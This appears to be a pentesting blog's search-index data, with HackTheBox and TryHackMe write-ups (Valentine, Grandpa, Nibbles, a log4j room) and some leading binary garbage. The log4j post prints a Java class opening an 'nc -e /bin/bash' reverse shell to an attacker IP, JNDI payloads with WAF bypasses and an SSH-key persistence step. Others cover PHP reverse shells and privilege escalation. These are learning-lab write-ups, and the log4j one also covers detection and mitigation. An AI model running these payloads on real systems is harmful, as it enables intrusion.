�_�^@3@2@�@�@E@D�N�D@/@�@A�Q�G�L�B@E@D@U@R@ @T@Q@F@C@�A@@I@K@DC@AB@@4@2@N@M@Y@K@L@X@ @@V@W@F@G@T@U@D@E@R@S@A@B@C@O@P@Q@#@@@O@AA0.0.1/decode.phpMContent-Type: application/x-www-form-urlencodedMContent-Length: 42MM$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==�)��G��T˽There is an interesting base64 string.echo &quot;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&quot; | base64 -d heartbleedbelievethehypeCould it be the passphrase for the private key we are looking for ?Initial FootholdWe know the key is called hype_key so the user might be hype. Let’s try to SSH into the machine using the private key and the passphrase.And we are in ! The flag can be found in the Desktop directory.Privilege EscalationLooking for interesting directories, we can see the hidden folder /.devs with a socket file inside and when looking through history, we see the user used tmux9 tmux -L dev_sess 10 tmux a -t dev_sess 11 tmux --help12 tmux -S /.devs/dev_sess The last command tmux -S /.devs/dev_sess use the argument -S to specify a socket-path and this particular socket is owned by root.hype@Valentine:/.devs$ ls -lah dev_sesssrw-rw---- 1 root hype 0 Dec 22 05:55 dev_sessIf we execute the same command, we land in a root tmux session where we can grab the flag.ConclusionThis machine was easy, with a good methodology I was able to find the dev directory on the web application very fast, and the testssl script really put the spotlight on the vulnerability to exploit. It was very interesting to read about this CVE and how it works. The privilege escalation was a piece of cake if you know where to search. (Looking for hidden dir and searching for previous commands runned by the user.)Thanks for reading and Merry Christmas to all ! :)" }, { "title": "Grandpa [HTB]", "url": "/posts/grandpa/", "categories": "Writeups", "tags": "htb, easy, windows", "date": "2021-12-18 17:45:00 +0100", "snippet": "GrandpaGrandpa is an easy windows machine available on HackTheBox and is the second box I chose in the OSCP learning series. Let’s dive into it.ReconnaissanceStarting with the usual TCP port scan with nmapsudo nmap -sS -sV -p- 10.129.95.233 -oA scan/grandpa_scan -vvPORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 6.0Only the port 80 is open, let’s see what is hiding behind the port.HTTP - Port 80Microsoft IIS web server is confirmed with the message Enabling and Disabling Dynamic Content&quot; in IIS Help on the frontpage.We can run default nmap script on the target to check for potential vuln.sudo nmap -sC -p 80 10.129.95.233 -vv PORT STATE SERVICE REASON80/tcp open http syn-ack ttl 127| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH|_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH|_http-title: Under Construction| http-webdav-scan: | Server Date: Fri, 17 Dec 2021 20:45:29 GMT| Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK| Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH| WebDAV type: Unknown|_ Server Type: Microsoft-IIS/6.0Running more aggressive nmap script, we find the webserver is using something called Frontpage.nmap --script=vuln -p 80 10.129.95.233 -vvPORT STATE SERVICE REASON80/tcp open http syn-ack ttl 127| http-enum: | /postinfo.html: Frontpage file or folder| /_vti_bin/_vti_aut/author.dll: Frontpage file or folder| /_vti_bin/_vti_aut/author.exe: Frontpage file or folder| /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder| /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder| /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder| /_vti_bin/shtml.dll: Frontpage file or folder|_ /_vti_bin/shtml.exe: Frontpage file or folder|_http-jsonp-detection: Couldn&#39;t find any JSONP endpoints.|_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=&amp;lt;path&amp;gt;|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#39;t find wp-login.php|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.| http-frontpage-login: | VULNERABLE:| Frontpage extension anonymous login| State: VULNERABLE| Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.Initial FootholdAfter searching around an hour for exploits against Frontpage and Microsoft IIS 6.0, an interesting article pops up : IIS 6.0 Vulnerability Leads to Code Execution.The article is talking about CVE-2017-7269, a vulnerability in IIS 6.0 using a buffer overflow to gain remote code execution.We can find multiple exploit on github, I chose this one (https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)Running a listener on our host, we execute the exploit and we are in !Privilege EscalationLet’s enumerate the system to find information we can use to escalate our privilege.First we can find general system information with systeminfoc:\\windows\\system32\\inetsrv&amp;gt;systeminfoHost Name: GRANPAOS Name: Microsoft(R) Windows(R) Server 2003, Standard EditionOS Version: 5.2.3790 Service Pack 2 Build 3790OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Uniprocessor FreeRegistered Owner: HTBRegistered Organization: HTBProduct ID: 69712-296-0024942-44782Original Install Date: 4/12/2017, 5:07:40 PMSystem Up Time: 0 Days, 16 Hours, 43 Minutes, 36 SecondsSystem Manufacturer: VMware, Inc.System Model: VMware Virtual PlatformSystem Type: X86-based PCProcessor(s): 1 Processor(s) Installed. [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 MhzBIOS Version: INTEL - 6040000Windows Directory: C:\\WINDOWSSystem Directory: C:\\WINDOWS\\system32Boot Device: \\Device\\HarddiskVolume1System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, MinskTotal Physical Memory: 1,023 MBAvailable Physical Memory: 753 MBPage File: Max Size: 2,470 MBPage File: Available: 2,295 MBPage File: In Use: 175 MBPage File Location(s): C:\\pagefile.sysDomain: HTBLogon Server: N/AHotfix(s): 1 Hotfix(s) Installed. [01]: Q147222Network Card(s): N/AThe OS is pretty old, it’s a Microsoft Windows Server 2003. Those information might be useful to use with tools like Windows Exploit Suggester.We can also check our privileges information.whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= ========SeAuditPrivilege Generate security audits DisabledSeIncreaseQuotaPrivilege Adjust memory quotas for a process DisabledSeAssignPrimaryTokenPrivilege Replace a process level token DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled We can see a very interesting token called SeImpersonatePrivilege. This token is used to impersonate a client after authentication. Whenever a user is assigned the SeImpersontatePrivilege, the user is permitted to run programs on behalf of that user to impersonate a client.There are tools we can use like JuicyPotato that will exploit this token to escalate to NT Authority\\System.In order to run the tool on the target, we first need to upload it there, and transfering files on a Windows machine can sometimes be a bit clumsy.The first binary we can try is certutil. This binary is available natively on Windows machines and its main goal is to manage certificates but pentesters and hackers alike diverted its original use to download malicious files on target. It’s called Living Off The Land, find more information on the LOLBAS project.Unfortunately without really knowing why, the certutil binary was not downloading the executable on the target.Lucky for us, there are other ways to upload files. The second method we can use is using the SMB protocol.First we create a SMB share with impacket-smbserver.py to make our executable available and we pull the file from the server with copy \\\\IP\\share\\filenameThe file has successfully been transfered on the target.We can now run our malicious executable.C:\\WINDOWS\\Temp&amp;gt;JuicyPotato.exeJuicyPotato.exeThe image file C:\\WINDOWS\\Temp\\JuicyPotato.exe is valid, but is for a machine type other than the current machine.We have a new problem…The executable seems to be incompatible with our target. Remember the OS is an old Windows Server 2003. We have to find a way to exploit this token. Back to online searching !After searching for specific information related to token and microsoft 2003, an article from Microsoft caught my eyes, the article is talking about an attack called Token Kidnapping. We can specify our research even more, and…boom ! Windows Privilege Escalation via Token KidnappingThe tool used is churrasco.exe, and can be found here.After uploading it on the target using the SMB method. Let’s see if it works…and yes it actually did work !churrasco.exe -d whoami/churrasco/--&amp;gt;Current User: NETWORK SERVICE /churrasco/--&amp;gt;Getting Rpcss PID .../churrasco/--&amp;gt;Found Rpcss PID: 672 /churrasco/--&amp;gt;Searching for Rpcss threads .../churrasco/--&amp;gt;Found Thread: 676 /churrasco/--&amp;gt;Thread not impersonating, looking for another thread.../churrasco/--&amp;gt;Found Thread: 680 /churrasco/--&amp;gt;Thread not impersonating, looking for another thread.../churrasco/--&amp;gt;Found Thread: 688 /churrasco/--&amp;gt;Thread impersonating, got NETWORK SERVICE Token: 0x730/churrasco/--&amp;gt;Getting SYSTEM token from Rpcss Service.../churrasco/--&amp;gt;Found NETWORK SERVICE Token/churrasco/--&amp;gt;Found LOCAL SERVICE Token/churrasco/--&amp;gt;Found SYSTEM token 0x728/churrasco/--&amp;gt;Running command with SYSTEM Token.../churrasco/--&amp;gt;Done, command should have ran as SYSTEM!nt authority\\systemWe can run the same command but replacing the whoami command with cmd to gain a shell as nt autorithy\\system !We have rooted the box !ConclusionAs I’m not used to work with Windows machines, it was a really tough challenge even though the box is considered easy. The fact that the machine was really old caught me off guard.Hacking this box made me learn alternative ways to transfer file on Windows and showed me that searching for solutions on Internet is a big part of the job and needed to be further improved." }, { "title": "Nibbles [HTB]", "url": "/posts/nibbles/", "categories": "Writeups", "tags": "htb, easy, linux", "date": "2021-12-17 00:00:00 +0100", "snippet": "NibblesWith the goal of taking the OSCP exam next year, I started my journey of pentesting machines from HackTheBox using the TJNull’s TryHarder machine list.Nibbles is is the first in a long series of boxes I will be doing here.It is an easy retired linux machine that should not be too hard to start with, so without further ado, let’s hack it.ReconnaissanceThe first thing to do is a TCP port scan on all ports.sudo nmap -sS -sV -p- 10.129.182.190 -oA scan/nibbles_nmap -vvPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTwo ports are open, the most interesting one is the web server as we cannot do much with SSH without credentials.HTTP - Port 80Land on a page with the message Hello World displayed. Looking at source code, we find a comment with a path to /nibbleblog. This is the path to a Nibbleblog CMS.Trying bruteforce directory enumeration with gobuster, there is a lot of path available to us to search in.===============================================================2021/12/16 22:05:25 Starting gobuster in directory enumeration mode===============================================================/index.php (Status: 200) [Size: 2987]/sitemap.php (Status: 200) [Size: 402] /content (Status: 301) [Size: 325] [--&amp;gt; http://10.129.96.84/nibbleblog/content/]/themes (Status: 301) [Size: 324] [--&amp;gt; http://10.129.96.84/nibbleblog/themes/] /feed.php (Status: 200) [Size: 302] /admin (Status: 301) [Size: 323] [--&amp;gt; http://10.129.96.84/nibbleblog/admin/] /admin.php (Status: 200) [Size: 1401] /plugins (Status: 301) [Size: 325] [--&amp;gt; http://10.129.96.84/nibbleblog/plugins/]/install.php (Status: 200) [Size: 78] /update.php (Status: 200) [Size: 1622] /README (Status: 200) [Size: 4628] /languages (Status: 301) [Size: 327] [--&amp;gt; http://10.129.96.84/nibbleblog/languages/]Pretty much everything is available, we can get the Apache version written at the bottom of index page Apache/2.4.18 (Ubuntu) ServerWe find the CMS version in the /README file.====== Nibbleblog ======Version: v4.0.3Codename: CoffeeRelease date: 2014-04-01/admin.php is a login page to an administration interface.We can enumerate user in /content/private/users.xml, the only user is admin&amp;lt;users&amp;gt; &amp;lt;user username=&quot;admin&quot;&amp;gt; &amp;lt;id type=&quot;integer&quot;&amp;gt;0&amp;lt;/id&amp;gt; &amp;lt;session_fail_count type=&quot;integer&quot;&amp;gt;0&amp;lt;/session_fail_count&amp;gt; &amp;lt;session_date type=&quot;integer&quot;&amp;gt;1514544131&amp;lt;/session_date&amp;gt; &amp;lt;/user&amp;gt; &amp;lt;blacklist type=&quot;string&quot; ip=&quot;10.10.10.1&quot;&amp;gt; &amp;lt;date type=&quot;integer&quot;&amp;gt;1512964659&amp;lt;/date&amp;gt; &amp;lt;fail_count type=&quot;integer&quot;&amp;gt;1&amp;lt;/fail_count&amp;gt; &amp;lt;/blacklist&amp;gt; &amp;lt;blacklist type=&quot;string&quot; ip=&quot;10.10.14.80&quot;&amp;gt; &amp;lt;date type=&quot;integer&quot;&amp;gt;1639688608&amp;lt;/date&amp;gt; &amp;lt;fail_count type=&quot;integer&quot;&amp;gt;1&amp;lt;/fail_count&amp;gt; &amp;lt;/blacklist&amp;gt;&amp;lt;/users&amp;gt;Trying bruteforcing the login form with Hydra, we hit a bruteforce protection, my HTB IP has been banned. :(After waiting a few minutes, it’s working again, so we can’t really bruteforce, we need to do some manual guessing to find the password.After searching on the Nibbleblog documentation and in the github repository, can’t seem to find anything close to a default credentials.With a complete random guess, the credentials was admin:nibbles.Initial FootholdLooking for exploits for Nibbleblog 4.0.3, we find a very interesting feature. If the plugin MyImage is installed, we could be able to upload any file without any restriction, the plugin only giving us warnings but no errors and we are lucky because the plugin is indeed, installed.Let’s try it first with a legitimate image to find the destination directory. After uploading my favorite image (a little tux pinguin), it appears on the main page !The image is in /nibbleblog/content/private/plugins/my_image/And it looks like it has been converted from .png to .jpg. Now that we know where the image is located, let’s upload something more evil, a reverse shell 😈As the webserver understands PHP, let’s find a reverse shell made in this programming language.One is avaible here on pentestmonkey’s github.We upload the malicious file, ignore the warning, and find our file in the directory and boom.We have our initial access on the machine !Privilege EscalationOur shell is not very sexy, we can upgrade it using the python3 methodpython3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; then Ctrl-Z stty raw -echo;fgexport TERM=xtermNow we have a fully interactive TTY, much better.sudo -lMatching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.shThe user nibbler is able to run a custom script as the root user in a path the user has the control on.There is a personal.zip file in the user home directory, extracting it reveals the monitor.sh file we are looking for.ls -lah /home/nibbler/personal/stuff/monitor.sh -rwxrwxrwx 1 nibbler nibbler 4.0K May 8 2015 /home/nibbler/personal/stuff/monitor.shDo you see the vulnerability here ? Because we have full control over the file, we can write absolutely whatever we want inside of it as long as it keeps the same path and filename.We can modify the file and give ourselves another reverse shell, the script running as the root user, it is the root user that will initiate the connection to our machine.And voila, we have now rooted the box !ConclusionThe box was pretty easy, the password guessing part was not the most fun and intuitive but overall the box was great.Hope you enjoy reading it through. :)" }, { "title": "Solar, exploiting log4j [THM]", "url": "/posts/solar/", "categories": "Writeups", "tags": "thm, log4j", "date": "2021-12-15 00:20:00 +0100", "snippet": "Solar, exploiting log4jSolar is a TryHackMe box designed to introduce and explore CVE-2021-44228 also called log4shell. The idea is to gain a better understanding on how the vulnerability work and also provide knowledge on how to detect and mitigate/patch.This room has been made by the great John Hammond.A little bit of historyOn December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package log4j. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this log4j version. This attack has been dubbed “Log4Shell” - John HammondThe vulnerability has been patched in the latest version of log4j (2.15.0rc2) but there is still potentially millions of applications vulnerable in the wild. (list)ReconnaissanceLet’s start with our default nmap TCP port scan to find potentially vulnerable services.sudo nmap -sS -T4 -p- 10.10.111.77 -vv PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 63111/tcp open rpcbind syn-ack ttl 638983/tcp open unknown syn-ack ttl 63The application is accessible through HTTP, we land on a Solr 8.11.0 dashboard. Apache Solr is an open-source enterprise-search platform, written in Java (Wikipedia)DiscoveryThe TryHackMe room make some Solr logs available for us to analyse.In the logs, we can see requests to the path /admin/cores with a parameter called param={}It could potentially be some GET or POST data sent with the request that gets include in the logs.This param parameter could be an entry point as the log4j will try to “parse” entries to enrich data, which could lead to undesirable action like execution of code.Proof of ConceptThe basic payload syntax is ${jndi:ldap://IP}.This payload use the JNDI (Java Naming and Directory Interface) functionnality to access external resources (and in our case a remote IP) using the ldap protocol.If we were to open a listener on a port on our attacking machine and send a GET request to the path with a fake parameter containing the payload, we would see a connection back from the server.This proves the log4j logging system query our attacking machine and is vulnerable to CVE-2021-44228.ExploitationThe problem is that our listener does not understand the ldap protocol, for this reason we need a LDAP Referral Server that will redirect the client request to a secondary HTTP server hosting the malicious file that will be ultimately executed on the target.We can use marshalsec as our LDAP Referall server. I will skip the java building step as it is not of interest here, but we should have a working LDAP server ready to run.The next step is to create a malicious java class that will get executed on our target.Exploit.javapublic class Exploit { static { try { java.lang.Runtime.getRuntime().exec(&quot;nc -e /bin/bash 10.9.25.40 4444&quot;); } catch (Exception e) { e.printStackTrace(); } }}This simple code is a java class running a reverse shell using exec() method. Finally we need to compile the code into a .class executable with javac Exploit.java -source 8 -target 8.We have everything we need to exploit the target. Now it’s time for the show !We host the malicious .class executable on our python3 HTTP server.We run the LDAP Referral server pointing to our python3 server and finally we open a listener on the port specified in the reverse shell.The only thing left to do is to GET request the vulnerable server just like the PoC but with a path pointing to our Exploit file.And we got our shell back ! Let’s summarize the exploitation chain. Curl request to injectable parameter with payload to our LDAP controlled server LDAP Referral server receives the request from Solr server and direct the connection to our second HTTP server Our secondary HTTP server serve the malicious java class Exploit.class The malicious java class is executed by the server and we receive our reverse shell in our listener.PersistenceAs we are the user solr, checking our home directory reveals a .ssh folder. We can create a persistence by generating a temporary key pair and add our public key to the .ssh/authorized_keys file.We can now properly connect to the target using SSH.DetectionLooking at the log inside the target, we see our injected payload.In our context, the vulnerability is easy to detect because it appears in a single parameter in a GET request and we used the default payload but in a real world environment, it could be very difficult to find, and even harder because of the massive amount of bypasses.John Hammond then shares some links from the community that worked hard those last few days to mitigate the threat.Feel free to browse them.BypassesThe syntax we used in our payload is the default one and it might be caught by Web Application Firewalls (WAFs).The room shows some bypasses we can experiment with.Here are some of them.${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}${${::-j}ndi:rmi://attackerendpoint.com/}What we need to understand, is that bypasses can be of many forms because the attack targets log4j and payloads can also access all the “tools” log4j uses to do its magic.MitigationA mitigation was released soon after the vulnerability was made public, we need to add the line SOLR_OPTS=&quot;$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true&quot; in the system-wide configuration file /etc/default/solr.in.shRetrying our previous exploit now fail which is good !PatchingAt the time of writing this writeup, a lot of applications are still vulnerable to CVE-2021-44228, please take some time to better understand the vulnerability and look out for patches from vendors as it is a critical threat affecting millions of different devices from web servers to software clients.Finally a message from John Hammond, I think is important to share.Please be understanding of this frenzy. There are so many potential places that this log4j vulnerability could be present, we may never see the end of this vulnerability for a long, long time. The onus is on you, on me, on each and every one of us to raise awareness of this incident, and hold the community accountable for actively responding. When the time comes, roll out the patches that have been made available and continue to hunt for instances of this vulnerability. It takes a village.CreditsI would like to thanks the amazing work from John Hammond for creating this room and being such a great actor in the cybersecurity community. Please check out his Youtube channel for more content and be free to complete this room as it will give you better knowledge to detect and mitigate the vulnerability.Hope you enjoy reading !" }, { "title": "Hello World", "url": "/posts/helloworld/", "categories": "Blog", "tags": "blog", "date": "2021-12-13 13:20:00 +0100", "snippet": "Hello World ! 💻Hello everyone and welcome to my blog.The idea behind this blog is to share my journey through the pentesting world as my ultimate goal is to pass the OSCP exam from Offensive Security.It will mainly consists of machine writeups from platform such as HackTheBox and TryHackMe but also various CTF I might encounter or even just blog posts about various topics I like related to cybersecurity.You can find more information about me in the about section.Hope you like it !" } ]
